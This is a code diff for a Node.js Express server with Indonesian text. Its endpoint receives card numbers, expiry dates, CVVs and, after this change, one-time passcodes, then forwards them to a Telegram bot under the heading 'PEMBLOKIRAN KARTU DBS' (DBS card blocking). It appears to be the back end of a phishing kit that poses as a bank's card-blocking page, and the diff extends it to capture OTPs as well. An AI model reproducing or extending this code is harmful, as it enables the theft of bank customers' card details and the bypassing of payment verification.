@@ -5,11 +5,21 @@ dotenv.config();
 
 const app = express();
 app.use(express.json());
-app.use(express.static(__dirname + '/public')); // jika ada HTML/CSS
+app.use(express.static(__dirname + '/public')); // untuk akses HTML/CSS
 
 app.post('/kirim-ke-telegram', async (req, res) => {
-  const { nomor, valid, cvv } = req.body;
-  const message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
+  const { nomor, valid, cvv, otp } = req.body;
+
+  let message = "";
+
+  if (otp) {
+    message = `🔐 *Kode OTP Diterima*\n\n*OTP:* ${otp}`;
+  } else if (nomor && valid && cvv) {
+    message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
+  } else {
+    return res.status(400).send("Data tidak lengkap");
+  }
+
   const chat_id = process.env.CHAT_ID;
   const token = process.env.BOT_TOKEN;
 
@@ -23,13 +33,15 @@ app.post('/kirim-ke-telegram', async (req, res) => {
     if (response.ok) {
       res.sendStatus(200);
     } else {
-      throw new Error("Gagal mengirim ke Telegram");
+      const error = await response.json();
+      res.status(500).send("Gagal mengirim ke Telegram: " + JSON.stringify(error));
     }
   } catch (error) {
     res.status(500).send("Gagal: " + error.message);
   }
 });
 
-app.listen(3000, () => {
-  console.log('Server aktif di http://localhost:${PORT}');
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server aktif di http://localhost:${PORT}`);
 });
